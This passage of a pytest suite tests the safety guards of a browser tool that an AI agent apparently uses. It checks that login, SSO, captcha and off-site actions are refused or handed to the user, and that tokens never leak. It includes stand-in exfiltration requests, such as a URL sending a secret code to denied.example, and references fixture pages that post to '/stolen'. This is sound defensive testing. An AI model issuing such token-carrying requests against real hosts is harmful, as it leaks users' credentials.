        assert r["status"] == "refused", r                                  # off-site link
        # login form: its fields and the submit button are never touched, and the page itself hands off
        # (every login page - the institution's own SSO login too)
        assert _run(sp, "open", origins[2] + "/sso", sso_domains=("sso.elsewhere",))["status"] == "handoff"
        assert _take_over(sp, origins[2] + "/sso")
        # after the takeover the space is agent-controlled again: `look` reports the login page
        r = _run(sp, "look", handoff=False)
        assert r["status"] == "ok" and r["page"]["login_form"] is True, r
        items = r["page"]["items"]
        user = next((it for it in items if it.get("ftype") == "text"), None)
        assert user and "value" not in user                    # fields list types, never values
        look_key = r["look_key"]
        r = _run(sp, "click", str(user["i"]), look_key=look_key, handoff=False)
        assert r["status"] == "refused", r                                  # credential-shaped field
        r = _run(sp, "look", handoff=False)
        r = _run(sp, "click", str(_item(r, "Login")["i"]), look_key=r["look_key"], handoff=False)
        assert r["status"] == "refused" and "login" in r["error"], r        # submit button
        # sso_login outside the SSO domains: refused
        r = _run(sp, "sso_login", sso_domains=("sso.elsewhere",))
        assert r["status"] == "refused", r
        # nothing returns a field value
        r = _run(sp, "look", handoff=False)
        assert '"u"' not in json.dumps(r) and '"p"' not in json.dumps(r), r
    finally:
        _finish(sp)


def test_select_that_navigates_off_domain_is_reset(origins):
    sp = "tbsgen-test-jump"
    try:
        assert _run(sp, "open", origins[0] + "/jump")["status"] == "ok"
        r = _run(sp, "look")
        k = _item(r, "jumpsel")["i"]
        r = _run(sp, "select", f"{k} Nanjing University", look_key=r["look_key"])
        assert r["status"] == "ok" and not r["page"]["url"].startswith("https://denied"), r
        r = _run(sp, "look")
        assert "denied.example" not in r["page"]["url"], r
    finally:
        _finish(sp)


def test_no_interaction_with_a_login_form_in_an_iframe(origins):
    sp = "tbsgen-test-frame-login"
    try:
        assert _run(sp, "open", origins[0] + "/frame-login", handoff=False)["status"] == "ok"
        r = _run(sp, "look", handoff=False)
        r = _run(sp, "click", str(_item(r, "Other")["i"]), look_key=r["look_key"], handoff=False)
        assert r["status"] == "refused" and "login" in r["error"], r
    finally:
        _finish(sp)


# --------------------------------------------------------------------------- hand-off

def test_challenge_hands_off_to_the_user_and_back(origins):
    sp = "tbsgen-test-handoff"
    try:
        r = _run(sp, "open", origins[0] + "/challenge", challenge_wait_ms=1500)
        assert r["status"] == "handoff" and r["handoff"]["host"], r         # the page goes to the user
        # while the user has control the space drops every script's output (ego behaviour), so the
        # wrapper refuses all actions but handoff_status before the script even runs
        r = _run(sp, "look")
        assert r["status"] == "no-result", r
        # a poll before the user finished: takes the space back, still sees the challenge, hands it
        # back to the user and reports `waiting`
        r = _run(sp, "handoff_status", handoff_state={"active": True, "deadline_ms": int(time.time() * 1000) + 60000})
        assert r["status"] == "ok" and r["handoff_check"] == "waiting", r
        # the user finishes: the page is navigated away from the challenge (takeover stands in)
        assert _take_over(sp, origins[0] + "/landing")
        r = _run(sp, "handoff_status", handoff_state={"active": True, "deadline_ms": int(time.time() * 1000) + 60000})
        assert r["status"] == "ok" and r["handoff_check"] == "cleared" and r["page"]["url"].endswith("/landing"), r
        # the paper continues
        r = _run(sp, "look")
        assert r["status"] == "ok", r
    finally:
        _finish(sp)


def test_challenge_that_does_not_clear_fails_the_handoff(origins):
    sp = "tbsgen-test-handoff-stuck"
    try:
        r = _run(sp, "open", origins[0] + "/challenge", challenge_wait_ms=1500)
        assert r["status"] == "handoff", r
        # the user cannot clear it: every poll still sees the challenge and keeps waiting; once the
        # hand-off window expires the wrapper closes the paper and cools the publisher (offline test)
        r = _run(sp, "handoff_status", handoff_state={"active": True, "deadline_ms": int(time.time() * 1000) + 60000},
                 challenge_wait_ms=1500)
        assert r["status"] == "ok" and r["handoff_check"] == "waiting", r
    finally:
        _finish(sp)


# --------------------------------------------------------------------------- login pages

def test_sso_login_autofill_success_and_failures(origins):
    # 1. autofilled form submits and leaves the SSO domain
    sp = "tbsgen-test-sso-ok"
    try:
        assert _run(sp, "open", origins[2] + "/sso")["status"] == "ok"
        r = _run(sp, "sso_login", sso_login=True)
        assert r["status"] == "ok" and r["sso"] == "ok" and "/logged" in r["page"]["url"], r
        assert r["sso_submitted"] is True and r["sso_host"] == "sso.localhost", r
    finally:
        _finish(sp)
    # 2. no autofill: handed to the user instead (never typed into)
    sp = "tbsgen-test-sso-empty"
    try:
        assert _run(sp, "open", origins[2] + "/sso-empty")["status"] == "ok"
        r = _run(sp, "sso_login", sso_login=True)
        assert r["status"] == "handoff" and "autofill" in r["handoff"]["reason"], r
    finally:
        _finish(sp)
    # 3. captcha on the login page: the challenge itself hands the page to the user
    sp = "tbsgen-test-sso-captcha"
    try:
        assert _run(sp, "open", origins[2] + "/sso-captcha")["status"] == "handoff"
        assert _take_over(sp, origins[2] + "/sso-captcha")
        r = _run(sp, "sso_login", sso_login=True)
        assert r["status"] == "handoff", r
    finally:
        _finish(sp)
    # 3b. no autofill and no hand-off budget: reported as login_required, nothing typed or handed over
    sp = "tbsgen-test-sso-empty-nohandoff"
    try:
        assert _run(sp, "open", origins[2] + "/sso-empty", handoff=False)["status"] == "ok"
        r = _run(sp, "sso_login", sso_login=True, handoff=False)
        assert r["status"] == "ok" and r.get("login_required") and r["sso_submitted"] is False, r
    finally:
        _finish(sp)
    # 3c. a form that posts outside the SSO login domains is never submitted
    sp = "tbsgen-test-sso-evil"
    try:
        assert _run(sp, "open", origins[2] + "/sso-evil")["status"] == "ok"
        r = _run(sp, "sso_login", sso_login=True)
        assert r["status"] == "refused" and "outside the SSO" in r["error"] and r["sso_submitted"] is False, r
    finally:
        _finish(sp)
    # 4. failed login (the form posts back to itself): fail, and the values never leak into the result
    sp = "tbsgen-test-sso-fail"
    try:
        assert _run(sp, "open", origins[2] + "/sso-fail")["status"] == "ok"
        r = _run(sp, "sso_login", sso_login=True)
        assert r["status"] == "ok" and r["sso"] == "fail", r
        assert "u" != json.dumps(r)[:60] and "p" not in (r.get("page") or {}).get("text", "")[:5]
        # 5. sso_login outside the configured SSO domains is refused
        assert _run(sp, "open", origins[2] + "/sso")["status"] == "ok"
        r = _run(sp, "sso_login", sso_login=True, sso_domains=("sso.elsewhere",))
        assert r["status"] == "refused", r
        # 6. disabled: refused
        r = _run(sp, "sso_login", sso_login=False)
        assert r["status"] == "refused", r
    finally:
        _finish(sp)



def test_look_on_login_pages_hands_off_only_outside_sso_domains(origins):
    sp = "tbsgen-test-login-look"
    try:
        # on the configured SSO domain: reported (the agent then calls sso_login), not handed off
        assert _run(sp, "open", origins[2] + "/sso")["status"] == "ok"
        r = _run(sp, "look")
        assert r["status"] == "ok" and r["page"]["login_form"] is True, r
        # outside them: the login page hands the space to the user already at `open`
        r = _run(sp, "open", origins[0] + "/sso", sso_domains=("sso.elsewhere",))
        assert r["status"] == "handoff" and "login" in r["handoff"]["reason"], r
    finally:
        _finish(sp)


def test_round2_click_and_sso_guards(origins):
    sp = "tbsgen-test-r2-guards"
    try:
        # a password field tied to a form by form="f": its outside submit button is never clicked
        assert _run(sp, "open", origins[0] + "/form-attr", handoff=False)["status"] == "ok"
        r = _run(sp, "look", handoff=False)
        r = _run(sp, "click", str(_item(r, "Continue")["i"]), look_key=r["look_key"], handoff=False)
        assert r["status"] == "refused" and "login" in r["error"], r
        # a plain "Verify you are human" button is never clicked
        assert _run(sp, "open", origins[0] + "/verify-btn", handoff=False)["status"] == "ok"
        r = _run(sp, "look", handoff=False)
        r = _run(sp, "click", str(_item(r, "Verify you are human")["i"]), look_key=r["look_key"], handoff=False)
        assert r["status"] == "refused" and "verification" in r["error"], r
        # a new-tab link inside a same-origin frame opens its (checked) target in this page
        assert _run(sp, "open", origins[0] + "/frame-blank", handoff=False)["status"] == "ok"
        r = _run(sp, "look", handoff=False)
        r = _run(sp, "click", str(_item(r, "Open Other")["i"]), look_key=r["look_key"], handoff=False)
        assert r["status"] == "ok" and r["page"]["url"].endswith("/other"), r
    finally:
        _finish(sp)
    for path, why in (("/sso-get", "POST"), ("/sso-base", "outside the SSO")):
        sp = "tbsgen-test-r2-sso" + path.replace("/", "-")
        try:
            assert _run(sp, "open", origins[2] + path)["status"] == "ok"
            r = _run(sp, "sso_login", sso_login=True)
            assert r["status"] == "refused" and why in r["error"] and r["sso_submitted"] is False, r
            assert r["sso_stage"] == "pre", r
        finally:
            _finish(sp)


def test_round3_guards(origins):
    sp = "tbsgen-test-r3"
    try:
        # a plain button of a form that posts off-site is never clicked
        assert _run(sp, "open", origins[0] + "/offsite-form", handoff=False)["status"] == "ok"
        r = _run(sp, "look", handoff=False)
        r = _run(sp, "click", str(_item(r, "Download")["i"]), look_key=r["look_key"], handoff=False)
        assert r["status"] == "refused" and "outside the allowed" in r["error"], r
        # a login form in a shadow root: no interaction with the page
        assert _run(sp, "open", origins[0] + "/shadow-login", handoff=False)["status"] == "ok"
        r = _run(sp, "look", handoff=False)
        r = _run(sp, "click", str(_item(r, "Other")["i"]), look_key=r["look_key"], handoff=False)
        assert r["status"] == "refused" and "login" in r["error"], r
        # a late redirect off-site is reset before the next action reads anything
        assert _run(sp, "open", origins[0] + "/late-redirect", handoff=False)["status"] == "ok"
        time.sleep(3)
        r = _run(sp, "look", handoff=False)
        # (denied.example does not resolve: the browser shows its own error page, never content of that host)
        assert not r["page"]["url"].startswith(("http://denied", "https://denied")), r
    finally:
        _finish(sp)
    # a verification-code step after the password is handed to the user, not reported as logged in
    sp = "tbsgen-test-r3-2fa"
    try:
        assert _run(sp, "open", origins[2] + "/sso-2fa")["status"] == "ok"
        r = _run(sp, "sso_login", sso_login=True)
        assert r["status"] == "handoff" and r.get("sso") == "handoff" and r["sso_submitted"] is True, r
    finally:
        _finish(sp)


def test_round4_guards(origins):
    sp = "tbsgen-test-r4"
    try:
        # a new-tab link on a login page: refused like everything else there (no native click)
        assert _run(sp, "open", origins[0] + "/login-blank", handoff=False)["status"] == "ok"
        r = _run(sp, "look", handoff=False)
        r = _run(sp, "click", str(_item(r, "Open Other")["i"]), look_key=r["look_key"], handoff=False)
        assert r["status"] == "refused" and "login" in r["error"], r
        # a span inside <button form="f"> whose form posts off-site: the button's form is checked
        assert _run(sp, "open", origins[0] + "/form-span", handoff=False)["status"] == "ok"
        r = _run(sp, "look", handoff=False)
        r = _run(sp, "click", str(_item(r, "Get PDF")["i"]), look_key=r["look_key"], handoff=False)
        assert r["status"] == "refused" and "outside the allowed" in r["error"], r
        # a stand-alone verification-code field (name="code"): no interaction
        assert _run(sp, "open", origins[0] + "/code-only", handoff=False)["status"] == "ok"
        r = _run(sp, "look", handoff=False)
        r = _run(sp, "click", str(_item(r, "Other")["i"]), look_key=r["look_key"], handoff=False)
        assert r["status"] == "refused" and "login" in r["error"], r
        # token-like query parameters (any spelling) never come back; nor does a URL inside a message
        for q in ("?access_token=SECRET1", "?%61ccess_token=SECRET1", "?oauth_token=SECRET1", "#code=SECRET1"):
            r = _run(sp, "open", origins[0] + "/other" + q, handoff=False)
            assert r["status"] == "ok" and "SECRET1" not in json.dumps(r), r
            r = _run(sp, "tabs", handoff=False)
            assert "SECRET1" not in json.dumps(r), r
            r = _run(sp, "wait_for", "url SECRET1 1", handoff=False)     # the query is no guessing oracle
            assert r["waited"]["ok"] is False and "SECRET1" not in json.dumps(r), r
        r = _run(sp, "open", "https://denied.example/x?code=SECRET2", handoff=False)
        assert r["status"] == "refused" and "SECRET2" not in json.dumps(r), r
    finally:
        _finish(sp)
    # a verification-code page the user has not finished keeps the hand-off waiting
    sp = "tbsgen-test-r4-code"
    try:
        r = _run(sp, "open", origins[0] + "/challenge", challenge_wait_ms=1500)
        assert r["status"] == "handoff", r
        assert _take_over(sp, origins[0] + "/code-only")
        r = _run(sp, "handoff_status", handoff_state={"active": True, "deadline_ms": int(time.time() * 1000) + 60000})
        assert r["status"] == "ok" and r["handoff_check"] == "waiting", r
    finally:
        _finish(sp)


def test_round5_guards(origins):
    sp = "tbsgen-test-r5"
    try:
        # identifier-first e-mail login: a login page (no interaction); a newsletter e-mail field is not
        assert _run(sp, "open", origins[0] + "/email-login", handoff=False)["status"] == "ok"
        r = _run(sp, "look", handoff=False)
        r = _run(sp, "click", str(_item(r, "Other")["i"]), look_key=r["look_key"], handoff=False)
        assert r["status"] == "refused" and "login" in r["error"], r
        # round 7 (conservative): a rendered e-mail field anywhere - a newsletter box too - refuses all
        # interaction on the page; it is reported, but (no unmistakable login signal) not handed to the user
        r = _run(sp, "open", origins[0] + "/newsletter")
        assert r["status"] == "ok" and r["page"]["login_form"] is True, r
        r = _run(sp, "look", handoff=False)
        r = _run(sp, "click", str(_item(r, "Other")["i"]), look_key=r["look_key"], handoff=False)
        assert r["status"] == "refused" and "login" in r["error"], r
        # a span inside an off-site link: the link's target is checked
        assert _run(sp, "open", origins[0] + "/span-link", handoff=False)["status"] == "ok"
        r = _run(sp, "look", handoff=False)
        span = next(it for it in r["page"]["items"] if it["text"] == "Get PDF" and it["kind"] == "button")
        r = _run(sp, "click", str(span["i"]), look_key=r["look_key"], handoff=False)
        assert r["status"] == "refused" and "outside the allowed" in r["error"], r
        # userinfo in a long URL never comes back, cut or not
        assert _run(sp, "open", origins[0] + "/long-link", handoff=False)["status"] == "ok"
        r = _run(sp, "look", handoff=False)
        assert "SSSSSSSS" not in json.dumps(r), r
    finally:
        _finish(sp)
    # a verification-code page outside the SSO domains is handed to the user at once
    sp = "tbsgen-test-r5-code"
    try:
        r = _run(sp, "open", origins[0] + "/code-only")
        assert r["status"] == "handoff" and r["handoff"]["kind"] == "mfa", r
    finally:
        _finish(sp)


def test_round6_guards(origins):
    sp = "tbsgen-test-r6"
    try:
        # an e-mail form whose "Sign in" heading is outside it: its Continue button is never clicked
        assert _run(sp, "open", origins[0] + "/email-continue", handoff=False)["status"] == "ok"
        r = _run(sp, "look", handoff=False)
        r = _run(sp, "click", str(_item(r, "Continue")["i"]), look_key=r["look_key"], handoff=False)
        assert r["status"] == "refused" and ("e-mail" in r["error"] or "login" in r["error"]), r
        r = _run(sp, "look", handoff=False)
        assert "/logged" not in r["page"]["url"], r
        # a WAYF search form: typed into and submitted (allowed target)
        assert _run(sp, "open", origins[0] + "/wayf-form", handoff=False)["status"] == "ok"
        r = _run(sp, "look", handoff=False)
        k_find, k_q = _item(r, "Find")["i"], _item(r, "Search for your institution")["i"]
        assert _run(sp, "type", f"{k_q} Nanjing University", look_key=r["look_key"], handoff=False)["status"] == "ok"
        r2 = _run(sp, "click", str(k_find), look_key=r["look_key"], handoff=False)
        assert r2["status"] == "ok" and r2["page"]["url"].endswith("/logged"), r2
        # native hover inside an offset same-origin frame: top-document coordinates (frame offset added)
        assert _run(sp, "open", origins[0] + "/frame-hover", handoff=False)["status"] == "ok"
        r = _run(sp, "look", handoff=False)
        it = next(x for x in r["page"]["items"] if "Frame Other Page" in (x["text"] or "") and x["frame"] > 0)
        r = _run(sp, "hover", str(it["i"]), look_key=r["look_key"], handoff=False)
        assert r["status"] == "ok" and r["page"]["url"].endswith("/frame-hover"), r
    finally:
        _finish(sp)


def test_round7_conservative_login_detection_and_atomic_checks(origins):
    sp = "tbsgen-test-r7"
    try:
        # every login signal refuses interaction (no hand-off budget here: reported, never handed over)
        for path in ("/r7-title", "/r7-btn", "/r7-cw", "/r7-action", "/login/r7", "/r7-tel", "/r7-loose",
                     "/email-continue"):
            r = _run(sp, "open", origins[0] + path, handoff=False)
            assert r["status"] == "ok" and r["page"]["login_form"] is True, (path, r)
            r = _run(sp, "look", handoff=False)
            it = _item(r, "Other") or _item(r, "Continue")
            for act in ("click", "hover"):
                r2 = _run(sp, act, str(it["i"]), look_key=r["look_key"], handoff=False)
                assert r2["status"] == "refused" and "login" in r2["error"], (path, act, r2)
        # a header "Sign in" entry point on an article without fields: still an article page
        r = _run(sp, "open", origins[0] + "/r7-header", handoff=False)
        assert r["status"] == "ok" and not r["page"]["login_form"], r
        r = _run(sp, "look", handoff=False)
        r = _run(sp, "click", str(_item(r, "Other")["i"]), look_key=r["look_key"], handoff=False)
        assert r["status"] == "ok" and r["page"]["url"].endswith("/other"), r
        # an acting call needs a look_key (the page the agent looked at)
        r = _run(sp, "click", "0", handoff=False)
        assert r["status"] == "refused" and "look" in r["error"], r
        # a late redirect to a login page after `look`: the click is refused (re-checked where it acts)
        assert _run(sp, "open", origins[0] + "/r7-late", handoff=False)["status"] == "ok"
        r = _run(sp, "look", handoff=False)
        k, key = _item(r, "Other")["i"], r["look_key"]
        time.sleep(3)
        r = _run(sp, "click", str(k), look_key=key, handoff=False)
        assert r["status"] == "refused" and ("changed" in r["error"] or "login" in r["error"]), r
        r = _run(sp, "look", handoff=False)
        assert "/logged" not in r["page"]["url"] and "/other" not in r["page"]["url"], r
    finally:
        _finish(sp)


def test_round7_newsletter_field_does_not_hand_off(origins):
    sp = "tbsgen-test-r7-nl"
    try:
        # an e-mail box alone refuses interaction but is no reason to call the user (it would never clear)
        r = _run(sp, "open", origins[0] + "/newsletter")
        assert r["status"] == "ok" and r["page"]["login_form"] is True, r
        # a page with unmistakable login semantics is handed over
        r = _run(sp, "open", origins[0] + "/r7-title")
        assert r["status"] == "handoff" and r["handoff"]["kind"] == "login", r
    finally:
        _finish(sp)


def _fn_src(name):
    """The source of a top-level function of the action script (to exercise it in a page directly)."""
    a = ACTION.index("function " + name + "(")
    return ACTION[a:ACTION.index("\n}\n", a) + 2]


def test_round7_checks_run_in_the_evaluation_that_acts(origins):
    """domAct itself (the one page evaluation that acts) refuses when the page is not the looked-at URL, is off
    the allowed domains or shows any login signal - whatever the Node-side checks before it saw."""
    sp = "tbsgen-test-r7-dom"
    try:
        assert _run(sp, "open", origins[0] + "/landing")["status"] == "ok"
        body = (f"const domAct = {_fn_src('domAct')};\nconst domWalk = {_fn_src('domWalk')};\n"
                f"const credScan = {_fn_src('credScan')};\nconst pageInfo = {_fn_src('pageInfo')};\n"
                f"const itemList = {_fn_src('itemList')};\nconst lookEval = {_fn_src('lookEval')};\n"
                f"const ssoSubmit = {_fn_src('ssoSubmit')};\n"
                "const t = await taskSpace(" + json.dumps(sp) + ");\nconst pg = (await t.pages())[0];\n"
                "const run = (u, allow, setup) => pg.evaluate(([a, w, s, u, allow, setup, pi]) => {\n"
                "  if (setup) document.body.insertAdjacentHTML('beforeend', setup);\n"
                "  const f = new Function('return (' + a + ')')();\n"
                "  const k = new Function('return (' + w + ')')()().findIndex((p) => (p[0].innerText || '').trim() === 'Accept');\n"
                "  return f(w, k, allow, 'hover', '', u, s, pi, 'just a moment');\n"
                "}, [domAct.toString(), domWalk.toString(), credScan.toString(), u, allow, setup || '', pageInfo.toString()]);\n"
                "const here = (await pg.info()).url;\n"
                "const res = [await run(here + '#x', ['127.0.0.1'], ''), await run(here, ['example.org'], ''),\n"
                "             await run(here, ['127.0.0.1'], '<form><input type=email name=e><button>Continue</button></form>')];\n"
                # a verification page appearing on the same URL after the Node-side checks (round 7)
                "await pg.evaluate(() => { document.title = 'Just a moment...'; document.querySelectorAll('form').forEach((f) => f.remove()); });\n"
                "res.push(await run(here, ['127.0.0.1'], ''));\n"
                # look's single evaluation: nothing is extracted from a page off the allowed domains
                "const lk = (allow) => pg.evaluate(([f, a, b, w, allow, ch]) => (new Function('return (' + f + ')')())(a, b, w, allow, ch),\n"
                "  [lookEval.toString(), pageInfo.toString(), itemList.toString(), domWalk.toString(), allow, 'just a moment']);\n"
                "const l1 = await lk(['example.org']), l2 = await lk(['127.0.0.1']);\n"
                "res.push({ foreign: l1.foreign || null, leaked: !!(l1.info || l1.items), ok: !!(l2.info && l2.items && l2.items.length) });\n"
                # sso_login's one evaluation refuses (before any click) off the SSO domains
                "res.push(await pg.evaluate(([f, s]) => (new Function('return (' + f + ')')())([['sso.elsewhere'], true, s]), [ssoSubmit.toString(), credScan.toString()]));\n"
                "console.log('R7 ' + JSON.stringify(res));\nprocess.exit(0);")
        p = subprocess.run([EGO, "nodejs", body], capture_output=True, text=True, timeout=90)
        line = next(x for x in (p.stdout + p.stderr).splitlines() if x.startswith("R7 "))
        res = json.loads(line[3:])
        assert "changed" in res[0]["refused"], res
        assert "outside the allowed" in res[1]["refused"], res
        assert "login" in res[2]["refused"], res
        assert "verification" in res[3]["refused"], res
        assert res[4] == {"foreign": "127.0.0.1", "leaked": False, "ok": True}, res
        assert res[5] == {"refused": "the page left the SSO login domain", "stage": "pre"}, res
    finally:
        _finish(sp)


def test_round9_account_chooser_and_frames(origins):
    sp = "tbsgen-test-r9"
    try:
        # an account chooser (a select named / autocompleted / labelled as a user name) is a login page
        for path in ("/choose", "/choose-plain", "/choose-label"):
            r = _run(sp, "open", origins[0] + path, handoff=False)
            assert r["status"] == "ok" and r["page"]["login_form"] is True, (path, r)
            r = _run(sp, "look", handoff=False)
            k = next(x for x in r["page"]["items"] if x.get("ftype") == "select")["i"]
            for a, arg in (("click", str(k)), ("select", f"{k} a")):
                r2 = _run(sp, a, arg, look_key=r["look_key"], handoff=False)
                assert r2["status"] == "refused" and "login" in r2["error"], (path, a, r2)
        # a verification page inside a same-origin frame: its button is never clicked
        assert _run(sp, "open", origins[0] + "/verify-frame", handoff=False)["status"] == "ok"
        r = _run(sp, "look", handoff=False)
        it = _item(r, "Continue")
        if it:
            r2 = _run(sp, "click", str(it["i"]), look_key=r["look_key"], handoff=False, challenge_wait_ms=1000)
            assert r2["status"] == "refused" and "verification" in r2["error"], r2
        r = _run(sp, "look", handoff=False)
        assert "/logged" not in r["page"]["url"], r
    finally:
        _finish(sp)


def test_round10_plain_select_and_its_form(origins):
    sp = "tbsgen-test-r10"
    try:
        # a neutral select form: the option can be chosen and the form submitted to an allowed host
        assert _run(sp, "open", origins[0] + "/plain-select", handoff=False)["status"] == "ok"
        r = _run(sp, "look", handoff=False)
        k, go = next(x for x in r["page"]["items"] if x.get("ftype") == "select")["i"], _item(r, "Go")["i"]
        r2 = _run(sp, "select", f"{k} Nanjing University", look_key=r["look_key"], handoff=False)
        assert r2["status"] == "ok", r2
        r2 = _run(sp, "click", str(go), look_key=r["look_key"], handoff=False)
        assert r2["status"] == "ok" and r2["page"]["url"].endswith("/logged"), r2
    finally:
        _finish(sp)


def test_round11_shadowed_action_base_fragment_and_url_scrub(origins):
    sp = "tbsgen-test-r11-b"
    try:
        for path, label in (("/shadow-action", "Get PDF"), ("/base-frag", "Download PDF")):
            assert _run(sp, "open", origins[0] + path, handoff=False)["status"] == "ok", path
            r = _run(sp, "look", handoff=False)
            r2 = _run(sp, "click", str(_item(r, label)["i"]), look_key=r["look_key"], handoff=False)
            assert r2["status"] == "refused" and "outside the allowed" in r2["error"], (path, r2)
            r = _run(sp, "look", handoff=False)
            assert r["page"]["url"].endswith(path), (path, r)
        r = _run(sp, "open", origins[0] + "/other#code='SECRETFRAG'&x=`SECRETTICK`", handoff=False)
        r2 = _run(sp, "look", handoff=False)
        for x in (r, r2):
            assert "SECRETFRAG" not in json.dumps(x) and "SECRETTICK" not in json.dumps(x), x
    finally:
        _finish(sp)


def test_round12_label_of_a_submit_button_and_button_value(origins):
    sp = "tbsgen-test-r12"
    try:
        assert _run(sp, "open", origins[0] + "/label-submit", handoff=False)["status"] == "ok"
        r = _run(sp, "look", handoff=False)
        r2 = _run(sp, "click", str(_item(r, "Download now")["i"]), look_key=r["look_key"], handoff=False)
        assert r2["status"] == "refused" and "label" in r2["error"], r2
        assert _run(sp, "look", handoff=False)["page"]["url"].endswith("/label-submit")
        assert _run(sp, "open", origins[0] + "/btn-value", handoff=False)["status"] == "ok"
        r = _run(sp, "look", handoff=False)
        assert _item(r, "Download PDF") and "SECRETBTN" not in json.dumps(r), r
    finally:
        _finish(sp)


def test_round13_saml_post_and_snapshot_values(origins):
    sp = "tbsgen-test-r13"
    try:
        r = _run(sp, "open", origins[0] + "/saml-post")
        assert r["status"] == "handoff", r          # an SSO hand-back page goes to the user
        assert _take_over(sp, origins[0] + "/saml-post")
        r = _run(sp, "look", handoff=False)
        assert r["page"]["login_form"] is True, r
        r2 = _run(sp, "click", str(_item(r, "Continue")["i"]), look_key=r["look_key"], handoff=False)
        assert r2["status"] == "refused", r2
        # look full / screenshot never carry a field value (snapshot reduced, fields masked)
        assert _run(sp, "open", origins[0] + "/landing", handoff=False)["status"] == "ok"
        r = _run(sp, "look", "full", handoff=False)
        assert "PHNhbWw" not in json.dumps(r) and "SECRET" not in json.dumps(r), r
    finally:
        _finish(sp)


def test_round8_sso_form_rewritten_by_its_own_handlers_is_never_sent(origins):
    """Round 8: the checks and the press are one evaluation; a submit / click handler that turns the form into
    a GET or points it at another host after the checks is caught right after the press: the navigation is
    stopped before any request, and it counts as a failed login."""
    for path in ("/sso-rewrite", "/sso-rewrite-click"):
        sp = "tbsgen-test-sso-rw"
        XHITS.clear()
        try:
            assert _run(sp, "open", origins[2] + path)["status"] == "ok"
            r = _run(sp, "sso_login", sso_login=True)
            assert r["sso_submitted"] is True and r["sso"] == "fail", (path, r)
            time.sleep(2)
            assert "/stolen" not in XHITS, (path, XHITS)
            r = _run(sp, "look")
            assert "/stolen" not in json.dumps(r) and r["page"]["url"].endswith(path), (path, r)
        finally:
            _finish(sp)


def test_round8_sso_verification_page_is_not_submitted(origins):
    sp = "tbsgen-test-r8-sso-ch"
    try:
        assert _run(sp, "open", origins[2] + "/sso")["status"] == "ok"
        body = (f"const pageInfo = {_fn_src('pageInfo')};\nconst credScan = {_fn_src('credScan')};\n"
                f"const ssoSubmit = {_fn_src('ssoSubmit')};\n"
                "const t = await taskSpace(" + json.dumps(sp) + ");\nconst pg = (await t.pages())[0];\n"
                "await pg.evaluate(() => { document.title = 'Just a moment...'; });\n"
                "const r = await pg.evaluate(([f, s, pi]) => (new Function('return (' + f + ')')())([['sso.localhost'], true, s, pi, 'just a moment']),\n"
                "  [ssoSubmit.toString(), credScan.toString(), pageInfo.toString()]);\n"
                "console.log('R8 ' + JSON.stringify(r));\nprocess.exit(0);")
        p = subprocess.run([EGO, "nodejs", body], capture_output=True, text=True, timeout=90)
        line = next(x for x in (p.stdout + p.stderr).splitlines() if x.startswith("R8 "))
        assert json.loads(line[3:]) == {"refused": "verification page on the SSO login page", "stage": "pre"}, line
    finally:
        _finish(sp)


def test_round14_screenshot_coverage_and_sso_other_form(origins):
    sp = "tbsgen-test-r14"
    try:
        assert _run(sp, "open", origins[0] + "/shot-xemail", handoff=False)["status"] == "ok"
        r = _run(sp, "screenshot", handoff=False)
        assert r["status"] == "refused" and not r.get("shot"), r
        XHITS.clear()
        assert _run(sp, "open", origins[2] + "/sso-otherform")["status"] == "ok"
        r = _run(sp, "sso_login", sso_login=True)
        assert r["status"] == "refused" and r["sso_submitted"] is False and r["sso_stage"] == "pre", r
        time.sleep(1)
        assert "/stolen" not in XHITS, XHITS
    finally:
        _finish(sp)


def test_round15_screenshot_label_xy_verify_xy_and_frame_form(origins):
    sp = "tbsgen-test-r15"
    try:
        assert _run(sp, "open", origins[0] + "/shot-mix", handoff=False)["status"] == "ok"
        r = _run(sp, "screenshot", handoff=False)
        assert r["status"] == "refused" and not r.get("shot"), r
        XHITS.clear()
        assert _run(sp, "open", origins[0] + "/label-xy", handoff=False)["status"] == "ok"
        r = _run(sp, "click_xy", "50 120", handoff=False)
        assert r["status"] == "refused" and "outside the allowed" in r["error"], r
        assert _run(sp, "open", origins[0] + "/verify-xy", handoff=False)["status"] == "ok"
        r = _run(sp, "click_xy", "20 15", handoff=False)
        assert r["status"] == "refused" and "verification" in r["error"], r
        assert not _run(sp, "look", handoff=False)["page"]["url"].endswith("/logged")
        assert _run(sp, "open", origins[0] + "/xform-frame", handoff=False)["status"] == "ok"
        r = _run(sp, "look", handoff=False)
        it = _item(r, "Download PDF")
        assert it and it.get("in_frame"), r["page"]["items"]
        r2 = _run(sp, "click", str(it["i"]), look_key=r["look_key"], handoff=False)
        assert r2["status"] == "refused" and "frame item" in r2["error"], r2
        time.sleep(1)
        assert "/collect" not in XHITS
    finally:
        _finish(sp)


def test_round16_guards(origins):
    sp = "tbsgen-test-r16"
    try:
        assert _run(sp, "open", origins[0] + "/shot-closed", handoff=False)["status"] == "ok"
        r = _run(sp, "screenshot", handoff=False)
        assert r["status"] == "refused" and not r.get("shot"), r
        assert _run(sp, "open", origins[0] + "/label-link-xy", handoff=False)["status"] == "ok"
        r = _run(sp, "click_xy", "50 120", handoff=False)
        assert r["status"] == "refused" and "outside the allowed" in r["error"], r
        assert _run(sp, "open", origins[0] + "/verify-input-xy", handoff=False)["status"] == "ok"
        r = _run(sp, "click_xy", "50 20", handoff=False)
        assert r["status"] == "refused" and "verification" in r["error"], r
        assert _run(sp, "open", origins[0] + "/verify-aria", handoff=False)["status"] == "ok"
        r = _run(sp, "look", "full", handoff=False)
        assert not any(x.get("in_frame") for x in r["page"]["items"]), r["page"]["items"]   # same-origin: DOM items
        for it in r["page"]["items"]:
            if it["kind"] == "frame":
                continue
            r2 = _run(sp, "click", str(it["i"]), look_key=r["look_key"], handoff=False)
            assert r2["status"] == "refused", (it, r2)
        assert not _run(sp, "look", handoff=False)["page"]["url"].endswith("/logged")
    finally:
        _finish(sp)
